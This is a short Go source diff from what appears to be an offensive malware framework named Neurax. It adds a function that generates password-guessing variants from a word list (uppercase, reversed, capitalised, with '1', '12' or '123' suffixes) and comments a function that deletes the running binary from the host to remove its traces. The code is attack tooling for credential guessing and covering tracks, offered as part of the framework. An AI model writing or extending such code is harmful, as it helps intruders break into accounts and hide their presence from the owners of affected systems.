@@ -462,7 +462,26 @@ func NeuraxPurge() {
 	handle_command("purge")
 }
 
+//Removes binary from host and quits
 func NeuraxPurgeSelf() {
 	os.Remove(os.Args[0])
 	os.Exit(0)
+}
+
+//Returns transformed words from input slice
+func NeuraxWordlist(words []string) []string {
+	wordlist := []string{}
+	for _, word := range words {
+		first_to_upper := strings.ToUpper(string(word[0])) + string(word[1:])
+		wordlist = append(wordlist, strings.ToUpper(word))
+		wordlist = append(wordlist, coldfire.Revert(word))
+		wordlist = append(wordlist, first_to_upper)
+		wordlist = append(wordlist, first_to_upper+"1")
+		wordlist = append(wordlist, first_to_upper+"12")
+		wordlist = append(wordlist, first_to_upper+"123")
+		wordlist = append(wordlist, word+"1")
+		wordlist = append(wordlist, word+"12")
+		wordlist = append(wordlist, word+"123")
+	}
+	return wordlist
 }
